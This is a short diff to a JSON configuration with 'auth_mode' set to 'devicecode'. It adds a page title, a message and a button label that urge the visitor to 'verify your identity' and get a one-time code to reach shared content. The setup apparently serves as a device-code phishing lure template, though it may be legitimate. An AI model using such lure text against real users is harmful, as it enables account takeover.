@@ -4,6 +4,24 @@
   "auth_mode": "devicecode",
   "fields": [
     {
+      "key": "title",
+      "label": "Page Title",
+      "type": "text",
+      "default": "Verify your identity"
+    },
+    {
+      "key": "message",
+      "label": "Page Message",
+      "type": "text",
+      "default": "Generate a one-time passcode to securely access your content."
+    },
+    {
+      "key": "button_text",
+      "label": "Button Text",
+      "type": "text",
+      "default": "Get verification code"
+    },
+    {
       "key": "file_name",
       "label": "File Name",
       "type": "text",
